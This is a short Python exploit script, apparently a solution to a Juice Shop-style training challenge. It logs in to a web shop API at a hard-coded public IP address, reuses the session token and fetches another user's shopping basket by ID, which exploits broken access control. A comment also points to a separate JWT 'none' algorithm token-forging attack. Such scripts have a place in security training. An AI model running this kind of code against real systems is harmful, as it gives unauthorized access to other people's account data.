import json
import sys

import requests

# The ID number of the basket you want
id = 1

s = requests.Session()

# Login with any user or forge a token with "JWT None Alg Attack.py"
r = s.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": 'example@example.com',
        "password": 'example',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Login:", r)
if r.status_code != 200:
    sys.exit()
s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})

r = s.get("http://43.241.202.47:3003/rest/basket/" + str(id))

print(r.status_code)
if r.status_code == 200:
    print("Basket:", r.text)
else:
    print("Failed to load basket with id:", id)
